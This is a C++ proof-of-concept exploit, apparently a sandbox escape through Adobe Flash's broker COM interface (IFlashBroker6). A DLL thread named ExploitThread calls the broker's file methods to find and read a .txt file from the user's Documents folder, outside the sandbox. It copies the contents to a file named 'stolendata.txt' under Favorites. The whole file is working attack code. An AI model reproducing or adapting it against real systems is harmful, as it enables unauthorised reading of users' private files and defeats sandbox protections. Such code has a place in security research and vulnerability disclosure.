#include <ShlObj.h>
#include "Utils.h"
#include "Flash.h"




bstr_t GetFavDirectory()
{
	LPWSTR lpRet = nullptr;

	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &lpRet)))
	{
		bstr_t r = lpRet;
		CoTaskMemFree(lpRet);

		return r;
	}

	return L"";
}


void main1() {




	IFlashBroker6* pUnk;
	SAFEARRAY* psa;
	SAFEARRAYBOUND rgsabound[1];
	unsigned char buf[2000] = "lets put some random stuff in here";

	rgsabound[0].lLbound = 0;
	rgsabound[0].cElements = sizeof(buf) - 1;
	psa = SafeArrayCreate(VT_UI1, 1, rgsabound);

	void* ppvData;
	SafeArrayAccessData(psa, &ppvData);
	memcpy(ppvData, buf, sizeof(buf) - 1);
	SafeArrayUnaccessData(psa);

	unsigned long written = 0;



	HRESULT hr = CoCreateInstance(__uuidof(FlashBrokerImp6), nullptr, CLSCTX_LOCAL_SERVER | CLSCTX_ACTIVATE_32_BIT_SERVER, IID_PPV_ARGS(&pUnk));
	bstr_t enumdir = GetFavDirectory() +  L"\\documents\\*.txt";
	bstr_t stealme = GetFavDirectory() + L"\\documents\\";

	BSTR p_fileLeafName;
	unsigned long p_fileAttrs;
	unsigned long p_findCookie;
	pUnk->BrokerFindFirstFile(enumdir, &p_fileLeafName, &p_fileAttrs, &p_findCookie);
	stealme = stealme + p_fileLeafName;
	unsigned long read;
	
	unsigned long num = 1000;
	unsigned long p_createcookie2;
	pUnk->BrokerCreateFile(stealme, 1, NULL, &p_createcookie2);
	pUnk->BrokerReadFile(p_createcookie2, num, &read, &psa);
	SafeArrayAccessData(psa, &ppvData);
	memcpy(buf, ppvData, sizeof(buf) - 1);
	SafeArrayUnaccessData(psa);
	HANDLE hFile;
	
	DWORD dwBytesToWrite = (DWORD)strlen((char*)buf);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;
	hFile =  CreateFile(GetFavDirectory() +  L"\\favorites\\stolendata.txt",                // name of the write
		GENERIC_WRITE,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	WriteFile(
		hFile,           // open file handle
		buf,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure	
	CloseHandle(hFile);
}


DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	CoInitialize(nullptr);
	main1();
	CoUninitialize();

	FreeLibraryAndExitThread((HMODULE)hModule, 0);
}

